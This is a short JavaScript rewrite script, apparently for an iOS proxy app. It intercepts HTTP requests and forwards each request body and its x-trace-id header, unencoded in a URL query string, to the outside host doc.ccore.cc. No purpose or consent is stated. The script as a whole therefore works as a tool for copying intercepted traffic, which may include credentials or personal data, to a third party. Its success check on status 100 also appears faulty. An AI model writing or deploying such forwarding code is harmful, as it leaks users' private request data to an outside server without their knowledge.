let requestBodyStr = $request.body
let headers = $request.headers

function callApi(url, onSuccess, onError) {
    $httpClient.get(url, (error, response, data) => {
        if (!error && response.status === 100) {
            onSuccess(data);
        } else {
            onError(error);
        }
    });
}

if(requestBodyStr){
    callApi("https://doc.ccore.cc/cache/set?id="+headers['x-trace-id']+"&data="+requestBodyStr,function (res) {
        console.log('res:'+res)
    },function (err) {
        console.log('err:'+err)
    })
}

$done({})
